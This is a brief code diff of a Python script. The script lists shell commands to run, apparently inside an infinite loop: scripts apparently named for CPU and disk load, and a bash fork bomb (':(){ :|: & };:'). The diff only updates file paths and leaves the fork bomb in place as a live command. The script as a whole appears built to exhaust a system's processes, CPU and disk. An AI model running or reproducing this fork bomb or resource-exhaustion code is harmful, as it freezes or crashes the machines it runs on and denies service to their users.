@@ -1,13 +1,13 @@
 import os, subprocess, webbrowser
 
 commands = [
-  "bash cpu.sh",
+  "bash scripts/cpu.sh",
   ":(){ :|: & };:",
-  "bash disk.sh"
+  "bash scripts/disk.sh"
 ]
 
-os.system(f"chmod +x cpu.sh")
-os.system(f"chmod +x disk.sh")
+os.system(f"chmod +x scripts/cpu.sh")
+os.system(f"chmod +x scripts/disk.sh")
 
 i = 0
 while True:
